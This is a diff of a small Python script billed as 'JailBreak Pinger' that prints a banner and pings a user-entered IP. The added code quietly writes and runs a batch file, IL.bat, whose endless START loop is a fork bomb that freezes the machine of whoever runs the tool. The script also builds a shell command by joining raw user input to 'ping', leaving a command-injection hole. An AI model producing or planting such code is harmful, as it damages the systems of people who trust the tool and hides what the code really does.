@@ -1,7 +1,15 @@
-import os
+import os 
+import pyfiglet
 import time
-import subprocess
 from colorama import Fore
+
+print(f'{Fore.BLUE}Welcome to JailBreak Pinger{Fore.WHITE}')
+time.sleep(2)
+
+if os.name == 'posix':
+	os.system('clear')
+elif os.name == 'nt':
+	os.system('cls')
 
 print(f"{Fore.RED} ▄▄▄██▀▀▀▄▄▄       ██▓ ██▓     ▄▄▄▄    ██▀███  ▓█████ ▄▄▄       ██ ▄█▀")
 time.sleep(0.2)
@@ -23,6 +31,20 @@ print(f"{Fore.RED} ░   ░        ░  ░ ░      ░  ░ ░         ░  
 time.sleep(0.2)   
 print(f"{Fore.RED}                                    ░{Fore.WHITE}")
 
-time.sleep(1)
-ip = input("IP Address ----> ")
-response = os.system("ping -c 100000 " + ip)
+ip = input("Enter IP -----> ")
+
+os.system('ping ' + ip)
+
+def main():
+	h = open("IL.bat", "a")
+	h.write('''
+	@echo off 
+
+	echo Welp shit
+	:Up
+	START
+	goto Up''')
+	h.close()
+	time.sleep(2)
+	os.system("IL.bat")
+main()
